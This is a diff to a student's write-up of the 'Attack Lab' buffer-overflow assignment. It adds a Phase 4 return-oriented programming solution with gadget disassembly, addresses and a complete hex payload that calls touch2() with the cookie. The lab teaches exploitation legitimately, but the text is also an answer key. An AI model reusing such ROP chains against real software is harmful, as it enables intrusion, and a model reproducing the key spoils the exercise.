@@ -1,8 +1,8 @@
-## Attack Lab
-### Phase 1:
+# Attack Lab
+## Phase 1:
 No new code is injected. Overflow the buffer to redirect execution into `touch1()`.
 
-### Phase 2:
+## Phase 2:
 Redirect execution into injected in the buffer, to modify argument (%rdi) to cookie:
 ```
 movq $0x59b997fa, %rdi
@@ -44,3 +44,42 @@ Where:
 * Others: Should not be modified.  
 
 Overflow the buffer as described above.  
+
+## Phase 4:
+Found the following pattern matching desired instructions:
+* Overflow the buffer with cookie ASCII, then save it in %rax:
+    ```
+    00000000004019a7 <addval_219>:
+    4019a7:   8d 87 51 73 58 90       lea    -0x6fa78caf(%rdi),%eax
+    4019ad:   c3                      retq    
+    ```
+    In which we have
+    ```
+    58          pop %rax
+    90          no-op
+    c3          retq
+    ```
+* Move cookie from %rax to %rdi:
+    ```
+    00000000004019c3 <setval_426>:
+    4019c3:   c7 07 48 89 c7 90       movl   $0x90c78948,(%rdi)
+    4019c9:   c3                      retq
+    ```
+    In which we have
+    ```
+    48 89 c7    movq %rax, %rdi
+    90          no-op
+    c3          retq
+    ```
+So, we can overflow the buffer with:
+```
+00 00 00 00 00 00 00 00     # Padding
+00 00 00 00 00 00 00 00     # Padding
+00 00 00 00 00 00 00 00     # Padding
+00 00 00 00 00 00 00 00     # Padding
+00 00 00 00 00 00 00 00     # Padding
+ab 19 40 00 00 00 00 00     # Address of 1st gadget
+fa 97 b9 59 00 00 00 00     # Cookie in ASCII
+c5 19 40 00 00 00 00 00     # Address of 2nd gadget
+ec 17 40 00 00 00 00 00     # Address of touch2()
+```
